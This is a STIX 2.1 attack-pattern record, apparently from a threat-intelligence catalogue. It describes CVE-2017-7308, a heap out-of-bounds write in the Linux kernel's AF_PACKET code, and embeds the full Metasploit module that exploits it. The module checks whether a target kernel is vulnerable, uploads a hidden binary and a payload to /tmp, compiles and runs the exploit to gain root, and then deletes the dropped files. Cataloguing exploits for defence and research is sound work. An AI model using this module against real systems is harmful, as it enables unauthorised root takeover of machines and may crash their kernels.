{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d761db07-8fec-4d29-b3ac-2afcec7c55ea",
    "created": "2024-08-14T16:58:48.680374Z",
    "modified": "2024-08-14T16:58:48.680378Z",
    "name": "AF_PACKET packet_set_ring Privilege Escalation",
    "description": " This module exploits a heap-out-of-bounds write in the packet_set_ring function in net/packet/af_packet.c (AF_PACKET) in the Linux kernel",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/af_packet_packet_set_ring_priv_esc.rb",
            "external_id": "af_packet_packet_set_ring_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7308"
        },
        {
            "source_name": "reference",
            "url": "https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.coresecurity.com/blog/solving-post-exploitation-issue-cve-2017-7308"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/kernel-exploits/blob/cve-2017-7308/CVE-2017-7308/poc.c"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AF_PACKET packet_set_ring Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a heap-out-of-bounds write in the packet_set_ring\n        function in net/packet/af_packet.c (AF_PACKET) in the Linux kernel\n        to execute code as root (CVE-2017-7308).\n\n        The bug was initially introduced in 2011 and patched in version 4.10.6,\n        potentially affecting a large number of kernels; however this exploit\n        targets only systems using Ubuntu Xenial kernels 4.8.0 < 4.8.0-46,\n        including Linux distros based on Ubuntu Xenial, such as Linux Mint.\n\n        The target system must have unprivileged user namespaces enabled and\n        two or more CPU cores.\n\n        Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation\n        may crash the kernel.\n\n        This module has been tested successfully on Linux Mint 18 (x86_64)\n        with kernel versions:\n\n        4.8.0-34-generic;\n        4.8.0-36-generic;\n        4.8.0-39-generic;\n        4.8.0-41-generic;\n        4.8.0-42-generic;\n        4.8.0-44-generic;\n        4.8.0-45-generic.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Andrey Konovalov', # Discovery and C exploit\n          'bcoles'     # Metasploit\n        ],\n      'DisclosureDate' => '2017-03-29',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'EDB', '41994' ],\n          [ 'CVE', '2017-7308' ],\n          [ 'BID', '97234' ],\n          [ 'URL', 'https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html' ],\n          [ 'URL', 'https://www.coresecurity.com/blog/solving-post-exploitation-issue-cve-2017-7308' ],\n          [ 'URL', 'https://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-7308.html', ],\n          [ 'URL', 'https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c' ],\n          [ 'URL', 'https://github.com/bcoles/kernel-exploits/blob/cve-2017-7308/CVE-2017-7308/poc.c' ]\n        ],\n      'Notes'          =>\n        {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_OS_DOWN ],\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w(Auto True False) ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    write_file path, data\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    cmd_exec \"chmod +x '#{path}'\"\n  end\n\n  def upload_and_compile(path, data)\n    upload \"#{path}.c\", data\n    gcc_cmd = \"gcc -o #{path} #{path}.c\"\n    if session.type.eql? 'shell'\n      gcc_cmd = \"PATH=$PATH:/usr/bin/ #{gcc_cmd}\"\n    end\n\n    output = cmd_exec gcc_cmd\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile\"\n    end\n\n    cmd_exec \"chmod +x #{path}\"\n  end\n\n  def strip_comments(c_code)\n    c_code.gsub(%r{/\\*.*?\\*/}m, '').gsub(%r{^\\s*//.*$}, '')\n  end\n\n  def exploit_data(file)\n    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2017-7308', file)\n  end\n\n  def live_compile?\n    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')\n\n    if has_gcc?\n      vprint_good 'gcc is installed'\n      return true\n    end\n\n    unless datastore['COMPILE'].eql? 'Auto'\n      fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'\n    end\n  end\n\n  def check\n    version = kernel_release\n    unless version =~ /^4\\.8\\.0-(34|36|39|41|42|44|45)-generic/\n      vprint_error \"Linux kernel version #{version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Linux kernel version #{version} is vulnerable\"\n\n    arch = kernel_hardware\n    unless arch.include? 'x86_64'\n      vprint_error \"System architecture #{arch} is not supported\"\n      return CheckCode::Safe\n    end\n    vprint_good \"System architecture #{arch} is supported\"\n\n    cores = get_cpu_info[:cores].to_i\n    min_required_cores = 2\n    unless cores >= min_required_cores\n      vprint_error \"System has less than #{min_required_cores} CPU cores\"\n      return CheckCode::Safe\n    end\n    vprint_good \"System has #{cores} CPU cores\"\n\n    config = kernel_config\n    if config.nil?\n      vprint_error 'Could not retrieve kernel config'\n      return CheckCode::Unknown\n    end\n\n    unless config.include? 'CONFIG_USER_NS=y'\n      vprint_error 'Kernel config does not include CONFIG_USER_NS'\n      return CheckCode::Safe\n    end\n    vprint_good 'Kernel config has CONFIG_USER_NS enabled'\n\n    unless userns_enabled?\n      vprint_error 'Unprivileged user namespaces are not permitted'\n      return CheckCode::Safe\n    end\n    vprint_good 'Unprivileged user namespaces are permitted'\n\n    if kptr_restrict? && dmesg_restrict?\n      vprint_error 'Both kernel.kptr_restrict and kernel.dmesg_destrict are enabled. KASLR bypass will fail.'\n      return CheckCode::Safe\n    end\n\n    if lkrg_installed?\n      vprint_error 'LKRG is installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'LKRG is not installed'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Upload exploit executable\n    executable_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile executable_path, strip_comments(exploit_data('poc.c'))\n      rm_f \"#{executable_path}.c\"\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx executable_path, exploit_data('exploit')\n    end\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Launch exploit\n    print_status 'Launching exploit...'\n    output = cmd_exec \"#{executable_path} #{payload_path}\"\n    output.each_line { |line| vprint_status line.chomp }\n    print_status 'Deleting executable...'\n    rm_f executable_path\n    Rex.sleep 5\n    print_status 'Deleting payload...'\n    rm_f payload_path\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-03-29",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}